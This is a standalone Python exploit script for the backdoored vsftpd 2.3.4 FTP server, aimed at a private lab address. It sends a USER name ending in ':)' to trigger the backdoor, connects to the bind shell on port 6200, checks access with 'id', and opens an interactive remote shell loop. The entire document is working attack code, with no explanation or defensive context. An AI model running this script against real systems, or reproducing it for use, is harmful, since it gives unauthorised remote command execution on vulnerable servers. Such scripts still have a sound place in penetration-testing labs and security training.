import socket
import random
import string

def rand_text_alphanumeric(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def exploit():
    target_ip = '192.168.127.181'
    target_port = 21
    backdoor_port = 6200

    # Try to connect to the backdoor port first
    try:
        nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        nsock.settimeout(30)
        nsock.connect((target_ip, backdoor_port))
        print("The port used by the backdoor bind listener is already open")
        handle_backdoor(nsock)
        return
    except socket.error:
        pass

    # Connect to the FTP service port
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(30)
        s.connect((target_ip, target_port))
    except socket.error as e:
        print(f"Failed to connect to {target_ip}:{target_port}")
        return

    banner = s.recv(1024).decode().strip()
    print(f"Banner: {banner}")

    username = rand_text_alphanumeric(random.randint(1, 6)) + ':)'
    s.send(f"USER {username}\r\n".encode())
    resp = s.recv(1024).decode().strip()
    print(f"USER: {resp}")

    if resp.startswith('530 '):
        print("This server is configured for anonymous only and the backdoor code cannot be reached")
        s.close()
        return

    if not resp.startswith('331 '):
        print(f"This server did not respond as expected: {resp}")
        s.close()
        return

    s.send(f"PASS {rand_text_alphanumeric(random.randint(1, 6))}\r\n".encode())

    # Try to connect to the backdoor port again
    try:
        nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        nsock.settimeout(30)
        nsock.connect((target_ip, backdoor_port))
        print("Backdoor service has been spawned, handling...")
        handle_backdoor(nsock)
    except socket.error:
        print("Failed to connect to backdoor port")
        s.close()
        return

    s.close()

def handle_backdoor(s):
    s.send(b"id\n")
    r = s.recv(1024).decode().strip()
    if "uid=" not in r:
        print("The service on port 6200 does not appear to be a shell")
        s.close()
        return

    print(f"UID: {r}")
    s.send(b"nohup /bin/sh >/dev/null 2>&1\n")
    interact(s)

def interact(s):
    try:
        while True:
            command = input("> ")
            if command.lower() == "exit":
                break
            s.send((command + "\n").encode())
            response = s.recv(4096).decode().strip()
            print(response)
    except KeyboardInterrupt:
        pass
    finally:
        s.close()

if __name__ == "__main__":
    exploit()